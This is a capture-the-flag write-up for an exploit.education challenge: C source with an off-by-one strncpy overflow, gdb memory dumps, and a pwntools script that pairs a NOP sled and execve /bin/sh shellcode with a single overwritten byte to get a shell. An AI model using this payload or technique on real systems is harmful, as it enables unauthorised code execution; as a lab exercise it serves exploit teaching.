# Challenge Source Code
```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
    "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *what = GREET;

char *greet(char *who) {
    char buffer[128];
    int maxSize;

    maxSize = strlen(who);
    if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
}

    strcpy(buffer, what);
    strncpy(buffer + strlen(buffer), who, maxSize);

    return strdup(buffer);
}

int main(int argc, char **argv) {
    char *ptr;
    printf("%s\n", BANNER);

#ifdef NEWARCH
    if (argv[1]) {
        what = argv[1];
    }
#endif

    ptr = getenv("ExploitEducation");
    if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, "Please specify an environment variable called ExploitEducation");
    }

    printf("%s\n", greet(ptr));
    return 0;
}
```
# Challenge Theory
This challenge is a 1 byte buffer overflow.
You have overwrite a single byte and then point it to something to get code execution.
# Working on the Challenge
## Identifying the Exploit
Setting the environment variable "ExploitEducation" outside of gdb will be done.
Also the "GREET" macro simply creates the string "Welcome, I am pleased to meet you".
This has the length of 34.
The buffer for the challenge is 128, but only 127 bytes can be read in.
This means 34 + 127 = 161, and according the dissassembly there is a total 168 on the stack frame.
```
0x00000000004006fd <+0>:     push   rbp
0x00000000004006fe <+1>:     mov    rbp,rsp
0x0000000000400701 <+4>:     push   rbx
0x0000000000400702 <+5>:     sub    rsp,0xa8
```
All of this combined means only the least significant bit can actually be overwritten.
Therefore, this exploit needs to be a bit more creative.
Taking a look at the stack with a 127 byte payload it has:
```
gef➤  x/22xg $rbp-0xa0
0x7fffffffe4f0: 0x2c656d6f636c6557      0x6c70206d61204920
0x7fffffffe500: 0x6f74206465736165      0x6f79207465656d20
0x7fffffffe510: 0x4141414141412075      0x4141414141414141
0x7fffffffe520: 0x4141414141414141      0x4141414141414141
0x7fffffffe530: 0x4141414141414141      0x4141414141414141
0x7fffffffe540: 0x4141414141414141      0x4141414141414141
0x7fffffffe550: 0x4141414141414141      0x4141414141414141
0x7fffffffe560: 0x4141414141414141      0x4141414141414141
0x7fffffffe570: 0x4141414141414141      0x4141414141414141
0x7fffffffe580: 0x4141414141414141      0x4141414141414141
0x7fffffffe590: 0x00007fffffffe541      0x00000000004007e9
```
The least significat byte of the address at "0x7fffffffe590" is changed to "41".
Now there is one place to jump to where the user controls data, which would be the env variable "ExploitEducation".
Since env variables are at the bottom of the stack(the stack frame of the whole program) there must be a value in between 0x00007fffffffe501, and 0x00007fffffffe5ff to jump to.
## Finding the Env Variable
To find the env variable using the gef extension the command grep will be used. 
Simply running "grep ExploitEducation=" will net the output
``` 
gef➤  grep ExploitEducation=
[+] Searching 'ExploitEducation=' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffeeff - 0x7fffffffef36  →   "ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
```
There are few things to note here.
First, the address is at "0x7fffffffeeff", but the exploit actually needs the start of the user input and not the varialbe itself.
To find this simply using grep to search for the user payload works very quickly.
This nets the value "0x7fffffffef10". 
```
gef➤  grep AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Searching 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffe512 - 0x7fffffffe549  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]" 
  0x7fffffffef10 - 0x7fffffffef47  →   "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]" 
```
Finally, the address holding this value will need to be found as well.
Setting a breakpoint before the actual program leaves will help in doing so.
```
gef➤  x/32xg 0x7fffffffe500
0x7fffffffe500: 0x00007ffff7ffc948      0x00000000000000a6
0x7fffffffe510: 0x00007fffffffe56f      0x0000000000000001
0x7fffffffe520: 0x4141414141414141      0x00007ffff7ffb300
0x7fffffffe530: 0x0000000000000000      0x0000000000600c00
0x7fffffffe540: 0x000000000040079b      0x0000000000000000
0x7fffffffe550: 0x0000000000000000      0x00007ffff7db6b1e
0x7fffffffe560: 0x00007ffff7ffb300      0x0a00000000000000
0x7fffffffe570: 0x00007ffff7ffb300      0x00007ffff7db9934
0x7fffffffe580: 0x4141414141414141      0x00007fffffffe541
0x7fffffffe590: 0x00007fffffffe628      0x00000000004007f1
0x7fffffffe5a0: 0x00007fffffffe618      0x00000001ffffe628
0x7fffffffe5b0: 0x000000000040079b      0x00007fffffffef10
0x7fffffffe5c0: 0x0000000000000001      0x00007ffff7d8fd62
0x7fffffffe5d0: 0x0000000000000000      0x00007fffffffe610
0x7fffffffe5e0: 0x0000000000000000      0x00007ffff7ffdbc8
0x7fffffffe5f0: 0x0400000100003e00      0x00000000004005c9
```
Within this dump the memory address "0x7fffffffe5b0" holds the memory address which points to the user input "0x00007fffffffef10".
Now all of the information needed to start writing exploits is acquired.
# Writing the Exploit
The exploit for this level is rather simple, add the shellcode, nopsled, and address.
Then pass it into the program with the env variable and then solve the level.
## Exploit Code 
```
#!/usr/bin/python3
from pwn import *
import sys

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = b""
payload += b"\x90" * 20
payload += shellcode
payload += b"A" * (126 - len(payload))
payload += b"\xd0"

sys.stdout.buffer.write(payload)
```
